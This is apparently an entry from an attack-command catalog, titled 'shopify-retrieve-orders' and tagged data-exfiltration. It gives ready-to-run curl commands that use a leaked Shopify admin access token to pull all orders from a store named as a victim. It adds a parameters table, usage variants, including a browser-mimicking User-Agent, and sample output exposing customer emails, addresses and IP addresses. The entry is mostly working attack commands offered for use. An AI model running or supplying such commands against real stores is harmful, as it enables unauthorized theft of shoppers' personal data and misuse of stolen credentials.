---
id: c-shopify-orders
name: shopify-retrieve-orders
type: command
executor: bash
data: >-
  curl -X GET
  "https://victim-store-mariogh.myshopify.com/admin/api/2023-10/orders.json" -H
  "X-Shopify-Access-Token: [LEAKED_TOKEN]" -H "Content-Type: application/json"
  -H "User-Agent: Mozilla/5.0 (compatible; Rigor/1.0.0; http://rigor.com)"
output: >-
  JSON array of orders with details like customer emails, addresses, IP
  addresses, and order data
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:18.707Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - shopify
  - api
  - data-exfiltration
verified: false
validated: true
submitted: true
---

# shopify-retrieve-orders

## Command

```bash
curl -X GET "https://victim-store-mariogh.myshopify.com/admin/api/2023-10/orders.json" -H "X-Shopify-Access-Token: [LEAKED_TOKEN]" -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0 (compatible; Rigor/1.0.0; http://rigor.com)"
```

## Description

This command retrieves all orders from a Shopify store using a leaked access token in the API request, demonstrating unauthorized data access to sensitive customer and order information.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Host (URL) | Target store domain, e.g., victim-store-mariogh.myshopify.com | Yes |
| X-Shopify-Access-Token | Leaked token for authentication | Yes |
| API Version | Endpoint version, e.g., 2023-10 | Yes |
| User-Agent | Optional header to mimic browser | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://example.myshopify.com/admin/api/2023-10/orders.json" -H "X-Shopify-Access-Token: shpat_abc123"
```

### Advanced Usage

```bash
curl -X GET "https://victim-store-mariogh.myshopify.com/admin/api/2023-10/orders.json?status=any&limit=50" -H "X-Shopify-Access-Token: [LEAKED_TOKEN]" -H "Content-Type: application/json"
```

## Expected Output

A JSON response containing an array of order objects, each with fields like id, email, customer address, billing address, line_items, and financial_status. Example snippet:

```json
{
  "orders": [
    {
      "id": 123456789,
      "email": "customer@example.com",
      "customer": {"email": "customer@example.com"},
      "shipping_address": {"address1": "123 Main St"},
      "client_details": {"browser_ip": "192.0.2.1"}
    }
  ]
}
```

## Related

- [[Related Procedure: Exploit-Leaked-Token-for-API-Access]]
